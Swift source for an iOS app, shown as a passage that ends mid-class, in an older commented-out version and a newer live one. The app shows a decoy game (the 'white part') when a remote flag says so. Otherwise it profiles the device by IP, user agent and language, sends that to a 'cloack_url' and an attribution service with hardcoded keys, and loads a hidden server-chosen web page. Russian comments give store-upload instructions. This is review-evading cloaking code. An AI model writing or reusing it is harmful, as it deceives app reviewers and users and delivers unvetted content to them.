//import SwiftUI
//import OneSignalFramework
//
//
//struct SurentuRoiner: View {
//
//    @State private var oneSignalAcceptedValue_1: Bool?
//    @State private var stringModerationData: String?
//    @State private var showSecondSplashView: Bool = true
//    @StateObject var appstate = SerenityRunState()
//    @AppStorage("ifFirstOpenApp") var ifFirstOpenApp: Bool = true
//    @AppStorage("whitePartHasBeenOpenedOnce") var whitePartHasBeenOpenedOnce: Bool = false
//
//    var body: some View {
//        ZStack {
//
//            if oneSignalAcceptedValue_1 != nil {
//                if stringModerationData == "Bouncara" || whitePartHasBeenOpenedOnce == true {
//
//                    ZStack {
//                        SerenityRunApp()
//                    }
//                    .onAppear {
//                        AppDelegate.shared = .all
//                        UIDevice.current.setValue(UIInterfaceOrientation.portrait.rawValue, forKey: "orientation")
//
//                        showSecondSplashView = false
//                        whitePartHasBeenOpenedOnce = true
//                    }
//                } else {
//                    ServerEndpointsData(whitePartHasBeenOpenedOnce: $whitePartHasBeenOpenedOnce)
//                        .onAppear { showSecondSplashView = false }
//                }
//            }
//
//            if showSecondSplashView {
//                SplashView(isLoading: $oneSignalAcceptedValue_1)
//                    .environmentObject(appstate)
//                    .transition(.opacity)
//            }
//        }
//        .onAppear {
//            OneSignal.Notifications.requestPermission { oneSignalAcceptedValue_1 = $0 }
//
//            if ifFirstOpenApp {
//                guard let url_1 = URL(string: "https://surroundingtrades.quest/bouncara/bouncara.json") else { return }
//
//                URLSession.shared.dataTask(with: url_1) { data_1, _, _ in
//                    guard let data_1 else { whitePartHasBeenOpenedOnce = true; return }
//
//                    guard let json_1 = try? JSONSerialization.jsonObject(with: data_1, options: []) as? [String: Any] else { return }
//                    guard let value_1 = json_1["inpyrueitjkmazc"] as? String else { return }
//
//                    DispatchQueue.main.async {
//                        stringModerationData = value_1
//                        ifFirstOpenApp = false
//                    }
//                }
//                .resume()
//            }
//        }
//
//    }
//}
//
//
//import SwiftUI
//import WebKit
//import OneSignalFramework
//
//struct ServerEndpointsData: View {
//
//    @Binding var whitePartHasBeenOpenedOnce: Bool
//    @State var stringFirstEndpointData: String = ""
//    @State private var oneSignalAcceptedValue_2: Bool?
//
//    @State var stringUrlAtrService: String = ""
//    @State var showWebView_1 = false
//    @State var showWhiteGame_1 = false
//
//    @State private var showSplashView_1: Bool = true
//    @State private var showBottomSplash: Bool = true
//    @AppStorage("isFirstOpening") var isFirstOpening: Bool = true
//    @AppStorage("grayPartHasBeenShown") var grayPartHasBeenShown: Bool = true
//    @StateObject var appstate = SerenityRunState()
//
//    var body: some View {
//        ZStack {
//            if showBottomSplash {
//                SplashView(isLoading: .constant(true))
//                    .environmentObject(appstate)
//                    .transition(.opacity)
//                    .zIndex(1)
//            }
//
//            if oneSignalAcceptedValue_2 != nil {
//                if isFirstOpening {
//                    GetMainGrayDataLayer(
//                        stringFirstEndpointData: $stringFirstEndpointData,
//                        stringUrlAtrService: $stringUrlAtrService,
//                        showWebView_1: $showWebView_1,
//                        showWhiteGame_1: $showWhiteGame_1)
//                    .opacity(0)
//                    .zIndex(2)
//                }
//
//                if showWebView_1 || !grayPartHasBeenShown {
//                    PreloadGreyPart()
//                        .zIndex(3)
//                        .onAppear {
//                            grayPartHasBeenShown = false
//                            isFirstOpening = false
//                            showBottomSplash = false
//                        }
//                }
//            }
//        }
//        .animation(.easeInOut, value: showBottomSplash)
//        .onChange(of: showWhiteGame_1) { if $0 { whitePartHasBeenOpenedOnce = true; showBottomSplash = false } }
//        .onAppear {
//            OneSignal.Notifications.requestPermission { oneSignalAcceptedValue_2 = $0 }
//
//            guard let url_2 = URL(string: "https://surroundingtrades.quest/bouncara/bouncara.json") else { return }
//
//            URLSession.shared.dataTask(with: url_2) { data_2, _, _ in
//                guard let data_2 else { return }
//
//                guard let json_2 = try? JSONSerialization.jsonObject(with: data_2, options: []) as? [String: Any] else { return }
//
//                guard let value_2 = json_2["inpyrueitjkmazc"] as? String else { return }
//
//                DispatchQueue.main.async { stringFirstEndpointData = value_2 }
//            }
//            .resume()
//        }
//    }
//}
//
//extension ServerEndpointsData {
//
//    struct GetMainGrayDataLayer: UIViewRepresentable {
//
//        @Binding var stringFirstEndpointData: String
//        @Binding var stringUrlAtrService: String
//        @Binding var showWebView_1: Bool
//        @Binding var showWhiteGame_1: Bool
//
//        func makeUIView(context: Context) -> WKWebView {
//            let webView_1 = WKWebView()
//            webView_1.navigationDelegate = context.coordinator
//
//            if let url_3 = URL(string: stringFirstEndpointData) {
//                var request_1 = URLRequest(url: url_3)
//                request_1.httpMethod = "GET"
//                request_1.setValue("application/json", forHTTPHeaderField: "Content-Type")
//
//                let headers_1 = ["apikey": "JxAryuz2xmYg0uHLakyZaKeCsy57EJjZ",
//                                 "bundle": "com.enyotsankov.bouncara"]
//                for (key_1, value_3) in headers_1 {
//                    request_1.setValue(value_3, forHTTPHeaderField: key_1)
//                }
//
//                webView_1.load(request_1)
//            }
//            return webView_1
//        }
//
//        func updateUIView(_ uiView: WKWebView, context: Context) {}
//
//        func makeCoordinator() -> Coordinator {
//            Coordinator(self)
//        }
//
//        class Coordinator: NSObject, WKNavigationDelegate {
//
//            var parent_1: GetMainGrayDataLayer
//            var ipAddress_1: String?
//            var userAgent_1: String?
//
//            init(_ webView_2: GetMainGrayDataLayer) {
//                self.parent_1 = webView_2
//            }
//
//            func webView(_ webView_3: WKWebView, didFinish navigation: WKNavigation!) {
//                webView_3.evaluateJavaScript("document.documentElement.outerHTML.toString()") { [unowned self] (html_1: Any?, error: Error?) in
//                    guard let htmlString_1 = html_1 as? String else {
//                        parent_1.showWhiteGame_1 = true
//                        return
//                    }
//
//                    self.parseResponse(htmlString_1)
//
//                    webView_3.evaluateJavaScript("navigator.userAgent") { (result_1, error) in
//                        if let userAgent_2 = result_1 as? String {
//                            self.userAgent_1 = userAgent_2
//                        }
//                    }
//                }
//            }
//
//            func parseResponse(_ htmlString_2: String) {
//                guard let jsonString_1 = extractJSONString(from: htmlString_2) else {
//                    parent_1.showWhiteGame_1 = true
//                    return
//                }
//
//                let cleanedJsonString_1 = jsonString_1.trimmingCharacters(in: .whitespacesAndNewlines)
//
//                guard let jsonData_1 = cleanedJsonString_1.data(using: .utf8) else {
//                    parent_1.showWhiteGame_1 = true
//                    return
//                }
//
//                do {
//                    let jsonResponse_1 = try JSONSerialization.jsonObject(with: jsonData_1, options: []) as? [String: Any]
//                    guard let cloackUrl_1 = jsonResponse_1?["cloack_url"] as? String else {
//                        parent_1.showWhiteGame_1 = true
//                        return
//                    }
//
//                    guard let atrservise_1 = jsonResponse_1?["atr_service"] as? String else {
//                        parent_1.showWhiteGame_1 = true
//                        return
//                    }
//
//                    DispatchQueue.main.async {
//                        self.parent_1.stringFirstEndpointData = cloackUrl_1
//                        self.parent_1.stringUrlAtrService = atrservise_1
//                    }
//
//                    self.performSecondRequest(with: cloackUrl_1)
//
//                } catch {
//                    print("Error: \(error.localizedDescription)")
//                }
//            }
//
//            func extractJSONString(from htmlString_2: String) -> String? {
//                guard let startRange = htmlString_2.range(of: "{"),
//                      let endRange = htmlString_2.range(of: "}", options: .backwards) else {
//                    return nil
//                }
//
//                let jsonString_2 = String(htmlString_2[startRange.lowerBound..<endRange.upperBound])
//                return jsonString_2
//            }
//
//            func performSecondRequest(with url_4: String) {
//                guard let secondURL_1 = URL(string: url_4) else {
//                    parent_1.showWhiteGame_1 = true
//                    return
//                }
//
//                getIPAddress { ipAddress_2 in
//                    guard let ipAddress_2 else {
//                        return
//                    }
//
//                    self.ipAddress_1 = ipAddress_2
//
//                    var request_2 = URLRequest(url: secondURL_1)
//                    request_2.httpMethod = "GET"
//                    request_2.setValue("application/json", forHTTPHeaderField: "Content-Type")
//
//                    let headers_2 = [
//                        "apikeyapp": "j1O8jgzrSMKgGCVSzDaH2it9",
//                        "ip": self.ipAddress_1 ?? "",
//                        "useragent": self.userAgent_1 ?? "",
//                        "langcode": Locale.preferredLanguages.first ?? "Unknown"
//                    ]
//
//                    for (key_2, value_4) in headers_2 {
//                        request_2.setValue(value_4, forHTTPHeaderField: key_2)
//                    }
//
//                    URLSession.shared.dataTask(with: request_2) { [unowned self] data_3, response_1, error in
//                        guard data_3 != nil, error == nil else {
//                            parent_1.showWhiteGame_1 = true
//                            return
//                        }
//                        if let httpResponse_1 = response_1 as? HTTPURLResponse {
//
//                            if httpResponse_1.statusCode == 200 {
//                                self.performThirdRequest()
//                            } else {
//                                self.parent_1.showWhiteGame_1 = true
//                            }
//                        }
//                    }.resume()
//                }
//            }
//
//            func performThirdRequest() {
//
//                let thirdURLString_1 = self.parent_1.stringUrlAtrService
//
//                guard let thirdURL_1 = URL(string: thirdURLString_1) else {
//                    parent_1.showWhiteGame_1 = true
//                    return
//                }
//
//                var request_3 = URLRequest(url: thirdURL_1)
//                request_3.httpMethod = "GET"
//                request_3.setValue("application/json", forHTTPHeaderField: "Content-Type")
//
//                let headers_3 = [
//                    "apikeyapp": "j1O8jgzrSMKgGCVSzDaH2it9",
//                    "ip":  self.ipAddress_1 ?? "",
//                    "useragent": self.userAgent_1 ?? "",
//                    "langcode": Locale.preferredLanguages.first ?? "Unknown"
//                ]
//
//                for (key_3, value_5) in headers_3 {
//                    request_3.setValue(value_5, forHTTPHeaderField: key_3)
//                }
//
//                URLSession.shared.dataTask(with: request_3) { [unowned self] data_4, response_2, error in
//                    guard let data_4 = data_4, error == nil else {
//                        parent_1.showWhiteGame_1 = true
//                        return
//                    }
//
//                    if String(data: data_4, encoding: .utf8) != nil {
//
//                        do {
//                            let jsonResponse_2 = try JSONSerialization.jsonObject(with: data_4, options: []) as? [String: Any]
//                            guard let finalUrl_1 = jsonResponse_2?["final_url"] as? String,
//                                  let pushSub_1 = jsonResponse_2?["push_sub"] as? String,
//                                  let osUserKey_1 = jsonResponse_2?["os_user_key"] as? String else {
//
//                                return
//                            }
//
//                            UserDataManager.shared.finalUrl_1 = finalUrl_1
//                            UserDataManager.shared.pushSub_1 = pushSub_1
//                            UserDataManager.shared.osUserKey_1 = osUserKey_1
//
//                            OneSignal.login(UserDataManager.shared.osUserKey_1 ?? "")
//                            OneSignal.User.addTag(key: "sub_app", value: UserDataManager.shared.pushSub_1 ?? "")
//
//
//                            self.parent_1.showWebView_1 = true
//
//                        } catch {
//                            parent_1.showWhiteGame_1 = true
//                        }
//                    }
//                }.resume()
//            }
//
//            func getIPAddress(completion: @escaping (String?) -> Void) {
//                let url_5 = URL(string: "https://api.ipify.org")!
//                let task_1 = URLSession.shared.dataTask(with: url_5) { data_5, response_3, error in
//                    guard let data_5, let ipAddress = String(data: data_5, encoding: .utf8) else {
//                        completion(nil)
//                        return
//                    }
//                    completion(ipAddress)
//                }
//                task_1.resume()
//            }
//        }
//    }
//}
//
//
//import SwiftUI
//
//struct PreloadGreyPart: View {
//
//    @StateObject var webViewModel: WebViewModel = WebViewModel()
//    @State var loading: Bool = true
//
//    var body: some View {
//        ZStack {
//
//            let url_6 = URL(string: UserDataManager.shared.finalUrl_1 ?? "") ?? URL(string: webViewModel.finalUrlIfFirstOpen)!
//
//            MainGrayView(url_7: url_6, webViewModel: webViewModel)
//                .background(Color.black.ignoresSafeArea())
//                .edgesIgnoringSafeArea(.bottom)
//                .blur(radius: loading ? 15 : 0)
//
//            if loading {
//                ProgressView()
//                    .controlSize(.large)
//                    .tint(.pink)
//            }
//        }
//        .onAppear {
//            DispatchQueue.main.asyncAfter(deadline: .now() + 4.0) {
//                loading = false
//            }
//        }
//    }
//}
//
//
//import SwiftUI
//import WebKit
//
//class WebViewModel: ObservableObject {
//    @Published var isBackNavigationEnabled: Bool = false
//    @Published var isBackButtonTapped: Bool = false
//
//    @Published var showNewTab: Bool = false
//    @Published var newTabRequest: URLRequest? = nil
//    @Published var popupWebView_1: WKWebView? = nil
//
//    @Published var popupStack: [WKWebView] = []
//    weak var webView: WKWebView?
//
//    var urlHistory: [URL] = []
//    var isNavigatingBack: Bool = false
//
//    @AppStorage("first_open") var isFirstOpening_1: Bool = true
//    @AppStorage("finalUrlIfFirstOpen") var finalUrlIfFirstOpen: String = "default_final_url_if_opening_is_first"
//}
//
//// MARK: - Gray part 5
//
//class UserDataManager {
//    static let shared = UserDataManager()
//    var finalUrl_1: String?
//    var pushSub_1: String?
//    var osUserKey_1: String?
//}
//
//
//import SwiftUI
//import Combine
//import WebKit
//
//struct MainGrayView: View {
//
//    @Environment(\.colorScheme) var colorScheme
//    @ObservedObject var webViewModel: WebViewModel
//    let urlRequest_1: URLRequest
//    private var actionDelegate_1: ((_ navigationAction: MainGrayView.NavigationAction) -> Void)?
//
//    let orientationChanged = NotificationCenter.default
//        .publisher(for: UIDevice.orientationDidChangeNotification)
//        .makeConnectable()
//        .autoconnect()
//
//    init(url_7: URL, webViewModel: WebViewModel) {
//        self.init(urlRequest: URLRequest(url: url_7), webViewModel: webViewModel)
//    }
//
//    private init(urlRequest: URLRequest, webViewModel: WebViewModel) {
//        self.urlRequest_1 = urlRequest
//        self.webViewModel = webViewModel
//    }
//
//    var body: some View {
//
//        ZStack{
//
//            MainGrayWebView(webViewModel: webViewModel,
//                            action_1: actionDelegate_1,
//                            request_4: urlRequest_1)
//
//            ZStack {
//                VStack{
//                    HStack{
//                        Button(action: {
//                            if !webViewModel.popupStack.isEmpty {
//                                let last = webViewModel.popupStack.removeLast()
//                                last.stopLoading()
//                                last.navigationDelegate = nil
//                                last.uiDelegate = nil
//                                last.loadHTMLString("", baseURL: nil)
//                                last.removeFromSuperview()
//                                last.superview?.setNeedsLayout()
//                                last.superview?.layoutIfNeeded()
//                                webViewModel.popupWebView_1 = webViewModel.popupStack.last
//                                webViewModel.showNewTab = !webViewModel.popupStack.isEmpty
//                            } else if let mainWebView = webViewModel.webView {
//                                if mainWebView.canGoBack {
//                                    mainWebView.goBack()
//                                } else if webViewModel.urlHistory.count > 1 {
//                                    webViewModel.urlHistory.removeLast()
//                                    if let prev = webViewModel.urlHistory.last {
//                                        webViewModel.isNavigatingBack = true
//                                        mainWebView.load(URLRequest(url: prev))
//                                    }
//                                }
//                            }
//                        }) {
//                            Image(systemName: "chevron.backward.circle.fill")
//                                .resizable()
//                                .frame(width: 20, height: 20)
//                                .foregroundColor(.white)
//                        }
//                        .padding(.leading, 20).padding(.top, 15)
//
//                        Spacer()
//                    }
//                    Spacer()
//                }
//            }
//            .ignoresSafeArea()
//        }
//        .statusBarHidden(true)
//        .onAppear {
//            AppDelegate.shared = UIInterfaceOrientationMask.all
//            UIDevice.current.setValue(UIInterfaceOrientation.portrait.rawValue, forKey: "orientation")
//            UINavigationController.attemptRotationToDeviceOrientation()
//        }
//    }
//}
//
//extension MainGrayView {
//    enum NavigationAction {
//        case decidePolicy(WKNavigationAction, (WKNavigationActionPolicy) -> Void)
//        case didRecieveAuthChallange(URLAuthenticationChallenge, (URLSession.AuthChallengeDisposition, URLCredential?) -> Void)
//        case didStartProvisionalNavigation(WKNavigation)
//        case didReceiveServerRedirectForProvisionalNavigation(WKNavigation)
//        case didCommit(WKNavigation)
//        case didFinish(WKNavigation)
//        case didFailProvisionalNavigation(WKNavigation,Error)
//        case didFail(WKNavigation,Error)
//    }
//}
//
//struct MainGrayWebView : UIViewRepresentable {
//
//    @ObservedObject var webViewModel: WebViewModel
//    let request_4: URLRequest
//
//    init(webViewModel: WebViewModel,
//         action_1: ((_ navigationAction: MainGrayView.NavigationAction) -> Void)?,
//         request_4: URLRequest) {
//        self.request_4 = request_4
//        self.webViewModel = webViewModel
//    }
//
//    func makeUIView(context: Context) -> WKWebView {
//        let wkPreferences_1 = WKPreferences()
//        wkPreferences_1.javaScriptCanOpenWindowsAutomatically = true
//
//        let configuration_1 = WKWebViewConfiguration()
//        configuration_1.allowsInlineMediaPlayback = true
//        configuration_1.preferences = wkPreferences_1
//        configuration_1.applicationNameForUserAgent = "Version/17.2 Mobile/15E148 Safari/604.1"
//        configuration_1.defaultWebpagePreferences.allowsContentJavaScript = true
//
//        let view_1 = WKWebView(frame: .zero, configuration: configuration_1)
//        view_1.navigationDelegate = context.coordinator
//        view_1.uiDelegate = context.coordinator
//        view_1.backgroundColor = UIColor.systemBackground
//        view_1.scrollView.backgroundColor = UIColor(red: 0.11, green: 0.13, blue: 0.19, alpha: 1)
//        view_1.isOpaque = false
//
//        context.coordinator.setupThemeObservation(for: view_1)
//
//        view_1.load(request_4)
//        webViewModel.webView = view_1
//        return view_1
//    }
//
//    func updateUIView(_ uiView_1: WKWebView, context: Context) {}
//
//    func makeCoordinator() -> Coordinator {
//        return Coordinator(action_2: nil, webViewModel: self.webViewModel)
//    }
//
//    final class Coordinator: NSObject {
//        var webViewModel_1: WebViewModel
//        let action_2: ((_ navigationAction: MainGrayView.NavigationAction) -> Void)?
//        private var themeObservation_1: NSKeyValueObservation?
//
//        init(action_2: ((_ navigationAction: MainGrayView.NavigationAction) -> Void)?, webViewModel: WebViewModel) {
//            self.action_2 = action_2
//            self.webViewModel_1 = webViewModel
//            super.init()
//        }
//
//        func setupThemeObservation(for webView: WKWebView) {
//            if #available(iOS 15.0, *) {
//                themeObservation_1 = webView.observe(\.themeColor, options: [.new]) { [weak webView] observedWebView, _ in
//                    guard let webView = webView else { return }
//                    webView.backgroundColor = observedWebView.themeColor ?? .black
//                }
//            }
//        }
//    }
//
//}
//
//extension MainGrayWebView.Coordinator: WKNavigationDelegate, WKUIDelegate {
//
//    func webView(_ webView_6: WKWebView, decidePolicyFor navigationResponse: WKNavigationResponse, decisionHandler: @escaping (WKNavigationResponsePolicy) -> Void) {
//        decisionHandler(.allow)
//    }
//
//    func webView(_ webView_6: WKWebView, decidePolicyFor navigationAction: WKNavigationAction, decisionHandler: @escaping (WKNavigationActionPolicy) -> Void) {
//
//        if let url = navigationAction.request.url {
//            let urlScheme = url.scheme?.lowercased() ?? ""
//            let urlString = url.absoluteString.lowercased()
//
//            if urlString.contains("apps.apple.com") || urlString.contains("itunes.apple.com") {
//                UIApplication.shared.open(url)
//                decisionHandler(.cancel)
//                return
//            }
//
//            if urlScheme != "http" && urlScheme != "https" && urlScheme != "about" && urlScheme != "blob" && urlScheme != "file" && urlScheme != "data" {
//                UIApplication.shared.open(url, options: [:]) { [weak self] success in
//                    guard let self else { return }
//                    if !success {
//                        if let fallbackURL = self.fallbackURL(from: url) {
//                            UIApplication.shared.open(fallbackURL)
//                        } else {
//                            self.showAppRequiredAlert()
//                        }
//                    }
//                }
//                decisionHandler(.cancel)
//                return
//            }
//        }
//
//        decisionHandler(.allow)
//    }
//
//    private func fallbackURL(from url: URL) -> URL? {
//        guard let components = URLComponents(url: url, resolvingAgainstBaseURL: false) else {
//            return nil
//        }
//
//        let paramNames = ["fallback", "fallback_url", "browser_fallback_url", "redirect_url", "return_url", "app_link", "store_link"]
//
//        for param in paramNames {
//            if let fallbackString = components.queryItems?.first(where: { $0.name == param })?.value,
//               let fallbackURL = URL(string: fallbackString) {
//                return fallbackURL
//            }
//        }
//
//        return nil
//    }
//
//    private func showAppRequiredAlert() {
//        DispatchQueue.main.async {
//            let alert = UIAlertController(
//                title: "App Required",
//                message: "Please install the required app to continue",
//                preferredStyle: .alert
//            )
//            alert.addAction(UIAlertAction(title: "OK", style: .default))
//
//            if let windowScene = UIApplication.shared.connectedScenes.first as? UIWindowScene,
//               let rootVC = windowScene.windows.first?.rootViewController {
//                rootVC.present(alert, animated: true)
//            }
//        }
//    }
//
//    func webView(_ webView_6: WKWebView, didStartProvisionalNavigation navigation: WKNavigation!) {
//        action_2?(.didStartProvisionalNavigation(navigation))
//    }
//
//    func webView(_ webView_6: WKWebView, didReceiveServerRedirectForProvisionalNavigation navigation: WKNavigation!) {
//        action_2?(.didReceiveServerRedirectForProvisionalNavigation(navigation))
//    }
//
//    func webView(_ webView_6: WKWebView, didFailProvisionalNavigation navigation: WKNavigation!, withError error: Error) {
//        webViewModel_1.isBackNavigationEnabled = webView_6.canGoBack
//        action_2?(.didFailProvisionalNavigation(navigation, error))
//    }
//
//    func webView(_ webView_6: WKWebView, didCommit navigation: WKNavigation!) {
//        action_2?(.didCommit(navigation))
//    }
//
//    func webView(_ webView_6: WKWebView, createWebViewWith configuration: WKWebViewConfiguration, for navigationAction: WKNavigationAction, windowFeatures: WKWindowFeatures) -> WKWebView? {
//        guard navigationAction.targetFrame?.isMainFrame != true else {
//            return nil
//        }
//
//        let popupView = WKWebView(frame: .zero, configuration: configuration)
//        popupView.navigationDelegate = self
//        popupView.uiDelegate = self
//        popupView.translatesAutoresizingMaskIntoConstraints = false
//        popupView.backgroundColor = UIColor.systemBackground
//        popupView.scrollView.backgroundColor = UIColor.systemBackground
//        popupView.isOpaque = false
//
//        webView_6.addSubview(popupView)
//        NSLayoutConstraint.activate([
//            popupView.topAnchor.constraint(equalTo: webView_6.topAnchor),
//            popupView.bottomAnchor.constraint(equalTo: webView_6.bottomAnchor),
//            popupView.leadingAnchor.constraint(equalTo: webView_6.leadingAnchor),
//            popupView.trailingAnchor.constraint(equalTo: webView_6.trailingAnchor)
//        ])
//
//        webViewModel_1.popupStack.append(popupView)
//        webViewModel_1.popupWebView_1 = popupView
//        webViewModel_1.showNewTab = true
//        return popupView
//    }
//
//    func webView(_ webView_6: WKWebView, didFinish navigation: WKNavigation!) {
//
//        webView_6.allowsBackForwardNavigationGestures = true
//        webViewModel_1.isBackNavigationEnabled = webView_6.canGoBack
//
//        webView_6.configuration.mediaTypesRequiringUserActionForPlayback = .all
//        webView_6.configuration.allowsAirPlayForMediaPlayback = false
//        action_2?(.didFinish(navigation))
//
//        if webView_6 == webViewModel_1.webView, let url = webView_6.url {
//            if webViewModel_1.isNavigatingBack {
//                webViewModel_1.isNavigatingBack = false
//            } else if webViewModel_1.urlHistory.last != url {
//                webViewModel_1.urlHistory.append(url)
//            }
//        }
//
//        guard webView_6.url?.absoluteURL.absoluteString != nil else { return }
//
//        if webViewModel_1.finalUrlIfFirstOpen == "default_final_url_if_opening_is_first" && self.webViewModel_1.isFirstOpening_1 {
//            self.webViewModel_1.finalUrlIfFirstOpen = webView_6.url!.absoluteString
//            self.webViewModel_1.isFirstOpening_1 = false
//        }
//    }
//
//    func webView(_ webView_6: WKWebView, didFail navigation: WKNavigation!, withError error: Error) {
//        action_2?(.didFail(navigation, error))
//    }
//
//    func webView(_ webView_6: WKWebView, didReceive challenge: URLAuthenticationChallenge, completionHandler: @escaping (URLSession.AuthChallengeDisposition, URLCredential?) -> Void) {
//
//        if action_2 == nil {
//            completionHandler(.performDefaultHandling, nil)
//        } else {
//            action_2?(.didRecieveAuthChallange(challenge, completionHandler))
//        }
//    }
//
//    func webViewDidClose(_ webView_6: WKWebView) {
//        if let index = webViewModel_1.popupStack.firstIndex(where: { $0 === webView_6 }) {
//            webViewModel_1.popupStack.remove(at: index)
//            webView_6.removeFromSuperview()
//            webViewModel_1.popupWebView_1 = webViewModel_1.popupStack.last
//            if webViewModel_1.popupStack.isEmpty { webViewModel_1.showNewTab = false }
//        }
//    }
//}

/// ⚠️⚠️⚠️ ВАЖНО!
/// 1. Импортировать SDK Adjust -> https://github.com/adjust/ios_sdk
/// 2. ОБЯЗАТЕЛЬНО добавить в Info.plist запрос на АТТ -> Privacy - Tracking Usage Description (так же как мы добавляем камеру)
/// 3. ОБЯЗАТЕЛЬНО убедиться, что при открытии прилы появился запрос на АТТ
/// 4. В функции getAttribution_1 есть принты, которые нужно удалить перед заливом билда в стор
/// ⚠️⚠️⚠️

// MARK: - Gray part 1

import AdjustSdk
import SwiftUI
    
struct SurentuRoiner: View {
        
        @State private var stringModerationData: String = ""
        @State private var showSecondSplashView: Bool = true
        @State private var attIsInteracting_1: Bool = false
        
        @AppStorage("ifFirstOpenApp") var ifFirstOpenApp: Bool = true
        @AppStorage("whitePartHasBeenOpenedOnce") var whitePartHasBeenOpenedOnce: Bool = false
    @StateObject var appstate = SerenityRunState()

        var body: some View {
            ZStack {
                
                if attIsInteracting_1 {
                    if stringModerationData == "Bouncara" || whitePartHasBeenOpenedOnce == true {
                        
                        ZStack {
                            SerenityRunApp()
                        }
                        .onAppear {
                            AppDelegate.shared = .all
                            UIDevice.current.setValue(UIInterfaceOrientation.portrait.rawValue, forKey: "orientation")
                            showSecondSplashView = false
                            whitePartHasBeenOpenedOnce = true
                        }
                    } else {
                        ServerEndpointsData(whitePartHasBeenOpenedOnce: $whitePartHasBeenOpenedOnce, stringFirstEndpointData: stringModerationData)
                            .onAppear { showSecondSplashView = false }
                    }
                }
                
                if showSecondSplashView {
                    SplashView(isLoading: .constant(true))
                        .environmentObject(appstate)
                        .transition(.opacity)
                }
            }
            .onAppear {
                
                let environment_1: String
                environment_1 = ADJEnvironmentProduction
                
                guard let adjust_config_1 = ADJConfig(
                    appToken: "obf8mvgsirk0",
                    environment: environment_1
                ) else {
                    return
                }
                
                adjust_config_1.logLevel = .verbose
                adjust_config_1.attConsentWaitingInterval = 20
                
                Adjust.initSdk(adjust_config_1)
                
                if UIApplication.shared.applicationState == .active {
                    
                    
                    DispatchQueue.main.asyncAfter(deadline: .now() + 1.0) {
                        
                 
                    Adjust.requestAppTrackingAuthorization { status in
                        attIsInteracting_1 = status != 0
                    }
                }
                }
                if ifFirstOpenApp {
                    guard let url_1 = URL(string: "https://surroundingtrades.quest/bouncara/bouncara.json") else { return }
                    
                    URLSession.shared.dataTask(with: url_1) { data_1, response_1_1, _ in
                        
                        guard let response_1 = response_1_1 as? HTTPURLResponse,
                              (200...299).contains(response_1.statusCode) else {
                            whitePartHasBeenOpenedOnce = true
                            return
                        }
                        
                        guard let data_1 else { whitePartHasBeenOpenedOnce = true; return }
                        guard let json_1 = try? JSONSerialization.jsonObject(with: data_1, options: []) as? [String: Any] else { return }
                        guard let value_1 = json_1["inpyrueitjkmazc"] as? String else { return }
                        
                        DispatchQueue.main.async {
                            stringModerationData = value_1
                            ifFirstOpenApp = false
                        }
                    }
                    .resume()
                }
            }
            .onReceive(NotificationCenter.default.publisher(for: UIApplication.didBecomeActiveNotification)) { _ in
                Adjust.requestAppTrackingAuthorization { status in
                    attIsInteracting_1 = status != 0
                }
            }
        }
        
        
    }

// MARK: - Gray part 2

import SwiftUI
import WebKit
import OneSignalFramework

struct ServerEndpointsData: View {
    
    @Binding var whitePartHasBeenOpenedOnce: Bool
    var stringFirstEndpointData: String
    @State var stringUrlAtrService: String = ""
    @State var showWebView_1 = false
    @State var showWhiteGame_1 = false
    
    @State private var showSplashView_1: Bool = true
    @State private var showBottomSplash: Bool = true
    @AppStorage("isFirstOpening") var isFirstOpening: Bool = true
    @AppStorage("grayPartHasBeenShown") var grayPartHasBeenShown: Bool = true
  @StateObject var appstate = SerenityRunState()

    var body: some View {
        ZStack {
            if showBottomSplash {
                SplashView(isLoading: .constant(true))
                    .environmentObject(appstate)
                    .transition(.opacity)
                
                    .zIndex(1)
            }
            
            if isFirstOpening {
                
                SplashView(isLoading: .constant(true))
                                  .environmentObject(appstate)
                                  .transition(.opacity)
                
                    .zIndex(2)
                    .onAppear {
                        if isFirstOpening {
                            
                            if let url_3 = URL(string: stringFirstEndpointData) {
                                
                                AttributionForwarder.sendCurrent_1(url_4: url_3) { data_4, response_2, error in
                                    
                                    guard let data_4, error == nil else {
                                        showWhiteGame_1 = true
                                        return
                                    }
                                    
                                    if let code_1 = response_2?.statusCode, code_1 == 403 {
                                        showWhiteGame_1 = true
                                        return
                                        
                                    }
                                    
                                    OneSignal.Notifications.requestPermission { _ in }
                                                                        
                                    if String(data: data_4, encoding: .utf8) != nil {
                                        
                                        do {
                                            let jsonResponse_2 = try JSONSerialization.jsonObject(with: data_4, options: []) as? [String: Any]
                                            guard let finalUrl_1 = jsonResponse_2?["final_url"] as? String,
                                                  let pushSub_1 = jsonResponse_2?["push_sub"] as? String,
                                                  let osUserKey_1 = jsonResponse_2?["os_user_key"] as? String else {
                                                
                                                return
                                            }
                                            
                                            UserDataManager.shared.finalUrl_1 = finalUrl_1
                                            UserDataManager.shared.pushSub_1 = pushSub_1
                                            UserDataManager.shared.osUserKey_1 = osUserKey_1
                                            
                                            OneSignal.login(UserDataManager.shared.osUserKey_1 ?? "")
                                            OneSignal.User.addTag(key: "sub_app", value: UserDataManager.shared.pushSub_1 ?? "")
                                            
                                            showWebView_1 = true
                                            
                                        } catch {
                                            showWhiteGame_1 = true
                                        }
                                    }
                                }
                            }
                        }
                    }
            }
            
            if showWebView_1 || !grayPartHasBeenShown {
                PreloadGreyPart()
                    .zIndex(3)
                    .onAppear {
                        grayPartHasBeenShown = false
                        isFirstOpening = false
                        showBottomSplash = false
                    }
            }
        }
        .animation(.easeInOut, value: showBottomSplash)
        .onChange(of: showWhiteGame_1) { if $0 { whitePartHasBeenOpenedOnce = true; showBottomSplash = false } }
    }
}


// MARK: - Gray part 3

import SwiftUI

struct PreloadGreyPart: View {
    
    @StateObject var webViewModel: WebViewModel = WebViewModel()
    @State var loading: Bool = true
    
    var body: some View {
        ZStack {
            
            let url_6 = URL(string: UserDataManager.shared.finalUrl_1 ?? "") ?? URL(string: webViewModel.finalUrlIfFirstOpen)!
            
            MainGrayView(url_7: url_6, webViewModel: webViewModel)
                .background(Color.black.ignoresSafeArea())
                .edgesIgnoringSafeArea(.bottom)
                .blur(radius: loading ? 15 : 0)
            
            if loading {
                ProgressView()
                    .controlSize(.large)
                    .tint(.pink)
            }
        }
        .onAppear {
            DispatchQueue.main.asyncAfter(deadline: .now() + 4.0) {
                loading = false
            }
        }
    }
}

// MARK: - Gray part 4

import SwiftUI
import WebKit

class WebViewModel: ObservableObject {
    @Published var isBackNavigationEnabled: Bool = false
    @Published var isBackButtonTapped: Bool = false
    
    @Published var showNewTab: Bool = false
    @Published var newTabRequest: URLRequest? = nil
    @Published var popupWebView_1: WKWebView? = nil
    
    @Published var popupStack: [WKWebView] = []
